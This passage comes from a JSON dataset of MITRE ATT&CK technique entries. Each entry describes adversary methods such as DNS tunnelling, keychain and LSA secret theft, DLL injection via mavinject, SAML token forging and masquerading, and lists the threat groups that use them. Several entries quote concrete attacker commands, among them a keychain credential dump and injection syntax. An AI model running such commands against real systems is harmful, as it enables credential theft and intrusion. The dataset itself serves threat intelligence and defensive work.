such as domain validation certificates, for free.^[[2]](https://letsencrypt.org/docs/faq/)^\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Honeybee"],"groups":["Silent Librarian","Lazarus Group","LuminousMoth","BlackTech"]},"T1583.002":{"id":"T1583.002","name":"DNS Server","description":"Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.\n\nBy running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.^[[1]](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Axiom","HEXANE"]},"T1561":{"id":"T1561","name":"Disk Wipe","description":"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).^[[1]](https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)^\n\nOn network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.^[[2]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/D_through_E.html#wp3557227463)^","platforms":["Linux","macOS","Windows","Network"],"tactics":["Impact"],"campaigns":[],"groups":[]},"T1071.004":{"id":"T1071.004","name":"DNS","description":"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.^[[1]](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling)^^[[2]](https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000)^ ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["Chimera","LazyScripter","APT41","Cobalt Group","OilRig","Ke3chang","APT39","Tropic Trooper","APT18","FIN7"]},"T1552.005":{"id":"T1552.005","name":"Cloud Instance Metadata API","description":"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.^[[1]](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)^ A cloud metadata API has been used in at least one high profile compromise.^[[2]](https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/)^\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.^[[3]](https://redlock.io/blog/instance-metadata-api-a-modern-day-trojan-horse)^\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at `http[:]//169.254.169.254`.\n","platforms":["IaaS"],"tactics":["Credential Access"],"campaigns":[],"groups":["TeamTNT"]},"T1555.002":{"id":"T1555.002","name":"Securityd Memory","description":"An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.^[[1]](http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain)^^[[2]](https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/)^\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.^[[1]](http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain)^^[[3]](http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way)^ Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.^[[1]](http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain)^","platforms":["Linux","macOS"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1615":{"id":"T1615","name":"Group Policy Discovery","description":"Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.^[[1]](https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/)^^[[2]](https://adsecurity.org/?p=2716)^\n\nAdversaries may use commands such as `gpresult` or various publicly available PowerShell functions, such as `Get-DomainGPO` and `Get-DomainGPOLocalGroup`, to gather information on Group Policy settings.^[[3]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult)^^[[4]](https://github.com/PowerShellEmpire/Empire)^ Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.","platforms":["Windows"],"tactics":["Discovery"],"campaigns":[],"groups":["Turla"]},"T1542.003":{"id":"T1542.003","name":"Bootkit","description":"Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nA bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). ^[[1]](https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf)^ The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. ^[[2]](http://www.symantec.com/connect/blogs/are-mbr-infections-back-fashion)^\n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.","platforms":["Linux","Windows"],"tactics":["Persistence","Defense Evasion"],"campaigns":[],"groups":["APT41","Lazarus Group","APT28"]},"T1025":{"id":"T1025","name":"Data from Removable Media","description":"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \n\nSome adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.","platforms":["Linux","macOS","Windows"],"tactics":["Collection"],"campaigns":[],"groups":["Gamaredon Group","APT28","Turla","Machete"]},"T1218.013":{"id":"T1218.013","name":"Mavinject","description":"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).^[[1]](https://lolbas-project.github.io/lolbas/Binaries/Mavinject/)^\n\nAdversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. `C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL`).^[[2]](https://cybersecurity.att.com/blogs/labs-research/lazarus-campaign-ttps-and-evolution)^^[[3]](https://reaqta.com/2017/12/mavinject-microsoft-injector/)^ Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. \n\nIn addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  `/HMODULE` command-line parameter (ex. `mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER`). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.^[[4]](https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1074.001":{"id":"T1074.001","name":"Local Data Staging","description":"Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.^[[1]](https://www.prevailion.com/darkwatchman-new-fileless-techniques/)^","platforms":["Linux","macOS","Windows"],"tactics":["Collection"],"campaigns":["Operation Honeybee","Operation Wocao","C0015","C0017"],"groups":["Threat Group-3390","Sidewinder","TEMP.Veles","FIN5","Patchwork","TeamTNT","Indrik Spider","Lazarus Group","Chimera","MuddyWater","APT3","Wizard Spider","Kimsuky","APT39","GALLIUM","Leviathan","menuPass","BackdoorDiplomacy","Mustang Panda","Dragonfly","FIN13","APT28","Volt Typhoon","Operation Wocao","Honeybee","Dragonfly 2.0","Machete","FIN6"]},"T1036.005":{"id":"T1036.005","name":"Match Legitimate Name or Location","description":"Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.","platforms":["Linux","macOS","Windows","Containers"],"tactics":["Defense Evasion"],"campaigns":["2016 Ukraine Electric Power Attack","C0018","SolarWinds Compromise","Operation CuckooBees","C0017","Operation Wocao","Operation Honeybee","Operation Sharpshooter"],"groups":["TeamTNT","Gamaredon Group","Volt Typhoon","BRONZE BUTLER","TA2541","APT41","Indrik Spider","FIN7","MuddyWater","WIRTE","Patchwork","Transparent Tribe","admin@338","Earth Lusca","BackdoorDiplomacy","Ferocious Kitten","APT29","APT28","Naikon","Chimera","APT32","Ke3chang","Tropic Trooper","Magic Hound","PROMETHIUM","Aoqin Dragon","LuminousMoth","Whitefly","Machete","TEMP.Veles","Carbanak","Lazarus Group","Darkhotel","APT1","Blue Mockingbird","Sidewinder","menuPass","Sowbug","APT39","Kimsuky","Poseidon Group","Silence","Fox Kitten","SideCopy","Mustang Panda","FIN13","Sandworm Team","Rocke","UNC2452"]},"T1587.003":{"id":"T1587.003","name":"Digital Certificates","description":"Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["C0011"],"groups":["APT29","PROMETHIUM"]},"T1565.001":{"id":"T1565.001","name":"Stored Data Manipulation","description":"Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.^[[1]](https://content.fireeye.com/apt/rpt-apt38)^^[[2]](https://www.justice.gov/opa/press-release/file/1092091/download)^ By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.","platforms":["Linux","macOS","Windows"],"tactics":["Impact"],"campaigns":[],"groups":["APT38"]},"T1110.002":{"id":"T1110.002","name":"Password Cracking","description":"Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.^[[1]](https://www.us-cert.gov/ncas/alerts/TA18-106A)^ \n\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.^[[2]](https://en.wikipedia.org/wiki/Password_cracking)^ The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.","platforms":["Linux","macOS","Windows","Office 365","Azure AD","Network"],"tactics":["Credential Access"],"campaigns":["Night Dragon"],"groups":["APT3","Dragonfly","APT41","FIN6","Dragonfly 2.0"]},"T1114.001":{"id":"T1114.001","name":"Local Email Collection","description":"Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.^[[1]](https://practical365.com/clients/office-365-proplus/outlook-cached-mode-ost-file-sizes/)^ IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.^[[2]](https://support.office.com/en-us/article/introduction-to-outlook-data-files-pst-and-ost-222eaf92-a995-45d9-bde2-f331f60e2790)^","platforms":["Windows"],"tactics":["Collection"],"campaigns":["Night Dragon"],"groups":["APT1","Chimera","Magic Hound"]},"T1555.001":{"id":"T1555.001","name":"Keychain","description":"Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service. \n\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility `security`. Keychain files are located in `~/Library/Keychains/`, `/Library/Keychains/`, and `/Network/Library/Keychains/`.^[[1]](https://developer.apple.com/documentation/security/keychain_services)^^[[2]](https://support.passware.com/hc/en-us/articles/4573379868567-A-Deep-Dive-into-Apple-Keychain-Decryption)^^[[3]](https://www.netmeister.org/blog/keychain-passwords.html)^\n\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command `security dump-keychain –d` will dump all Login Keychain credentials from `~/Library/Keychains/login.keychain-db`. Adversaries may also directly read Login Keychain credentials from the `~/Library/Keychains/login.keychain` file. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.^[[4]](http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way)^^[[5]](https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/collection/osx/keychaindump_decrypt.py)^  ","platforms":["macOS"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1547":{"id":"T1547","name":"Boot or Logon Autostart Execution","description":"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.^[[1]](http://msdn.microsoft.com/en-us/library/aa376977)^^[[2]](https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx)^^[[3]](https://msdn.microsoft.com/library/windows/desktop/ms725475.aspx)^^[[4]](https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order)^^[[5]](https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf)^ These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.","platforms":["Linux","macOS","Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1003.004":{"id":"T1003.004","name":"LSA Secrets","description":"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.^[[1]](https://www.passcape.com/index.php?section=docsys&cmd=details&id=23)^^[[2]](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN)^^[[3]](https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf)^ LSA secrets are stored in the registry at `HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets`. LSA secrets can also be dumped from memory.^[[4]](https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)^\n\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.^[[4]](https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)^","platforms":["Windows"],"tactics":["Credential Access"],"campaigns":[],"groups":["MuddyWater","Threat Group-3390","OilRig","Leafminer","APT33","APT29","menuPass","Dragonfly","Ke3chang","Dragonfly 2.0"]},"T1600":{"id":"T1600","name":"Weaken Encryption","description":"Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications. ^[[1]](https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices)^\n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.\n\nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. ^[[2]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^","platforms":["Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1606.002":{"id":"T1606.002","name":"SAML Tokens","description":"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.^[[1]](https://blogs.microsoft.com/on-the-issues/2020/12/13/customers-protect-nation-state-cyberattacks/)^ The default lifetime of a SAML token is one hour, but the validity period can be specified in the `NotOnOrAfter` value of the `conditions ...` element in a token. This value can be changed using the `AccessTokenLifetime` in a `LifetimeTokenPolicy`.^[[2]](https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-configurable-token-lifetimes)^ Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.^[[3]](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)^\n\nAn adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.^[[4]](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)^ This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.^[[4]](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)^","platforms":["Azure AD","SaaS","Windows","Office 365","Google Workspace","IaaS"],"tactics":["Credential Access"],"campaigns":["SolarWinds Compromise"],"groups":["APT29","UNC2452"]},"T1036.008":{"id":"T1036.008","name":"Masquerade File Type","description":"Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file’s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file’s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file’s type. For example, the header of a JPEG file,  is ` 0xFF 0xD8` and the file extension is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header’s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. \n\nCommon non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of `test.gif`. A user may not know that a file is malicious due to the benign appearance and file extension.\n\nPolygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.^[[1]](https://unit42.paloaltonetworks.com/polyglot-file-icedid-payload)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":["2016 Ukraine Electric Power Attack","Operation Dream Job"],"groups":["Volt Typhoon"]},"T1489":{"id":"T1489","name":"Service Stop","description":"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.^[[1]](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)^^[[2]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)^ \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as `MSExchangeIS`, which will make Exchange content inaccessible ^[[2]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)^. In some cases, adversaries may stop or disable many or all services to render systems unusable.^[[1]](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)^ Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.^[[3]](https://www.secureworks.com/research/wcry-ransomware-analysis)^","platforms":["Windows","Linux","macOS"],"tactics":["Impact"],"campaigns":[],"groups":["Lazarus Group","LAPSUS$","Wizard Spider","Indrik Spider"]},"T1587.001":{"id":"T1587.001","name":"Malware","description":"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.^[[1]](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf)^^[[2]](https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/)^^[[3]](https://arstechnica.com/information-technology/2014/06/active-malware-operation-let-attackers-sabotage-us-energy-industry/)^^[[4]](https://therecord.media/fbi-fin7-hackers-target-us-companies-with-badusb-devices-to-install-ransomware/)^\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).^[[5]](https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["Operation Wocao","SolarWinds Compromise","Operation Ghost","C0010","CostaRicto","Operation Sharpshooter","Operation Dream Job"],"groups":["Kimsuky","FIN13","Indrik Spider","Lazarus Group","LuminousMoth","Sandworm Team","APT29","Aoqin Dragon","Cleaver","Moses Staff","Turla","Ke3chang","TeamTNT","FIN7","UNC2452","Night Dragon"]},"T1652":{"id":"T1652","name":"Device Driver Discovery","description":"Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).\n\nMany OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.^[[1]](https://learn.microsoft.com/windows-server/administration/windows-commands/driverquery)^^[[2]](https://learn.microsoft.com/windows/win32/api/psapi/nf-psapi-enumdevicedrivers)^ Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.^[[3]](https://learn.microsoft.com/windows-hardware/drivers/install/overview-of-registry-trees-and-keys)^\n\nOn Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.^[[4]](https://www.tldp.org/LDP/lkmpg/2.4/lkmpg.pdf)^^[[5]](https://man7.org/linux/man-pages/man8/lsmod.8.html)^^[[6]](https://linux.die.net/man/8/modinfo)^","platforms":["Linux","macOS","Windows"],"tactics":["Discovery"],"campaigns":[],"groups":[]},"T1087.002":{"id":"T1087.002","name":"Domain Account","description":"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as `net user /domain` and `net group /domain` of the [Net](https://attack.mitre.org/software/S0039) utility, `dscacheutil -q group`on macOS, and `ldapsearch` on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including `Get-ADUser` and `Get-ADGroupMember` may enumerate members of Active Directory groups.  ","platforms":["Linux","macOS","Windows"],"tactics":["Discovery"],"campaigns":["SolarWinds Compromise","Operation CuckooBees","Operation Wocao","Operation Dream Job"],"groups":["FIN13","FIN6","Ke3chang","MuddyWater","LAPSUS$","Chimera","menuPass","OilRig","Turla","Wizard Spider","Fox Kitten","Poseidon Group","Volt Typhoon","Sandworm Team","BRONZE BUTLER","Dragonfly","Lazarus Group","APT29","Operation Wocao","Dragonfly 2.0"]},"T1547.014":{"id":"T1547.014","name":"Active Setup","description":"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.^[[1]](https://helgeklein.com/blog/2010/04/active-setup-explained/)^ These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under ` HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\` and setting a malicious value for `StubPath`. This value will serve as the program that will be executed when a user logs into the 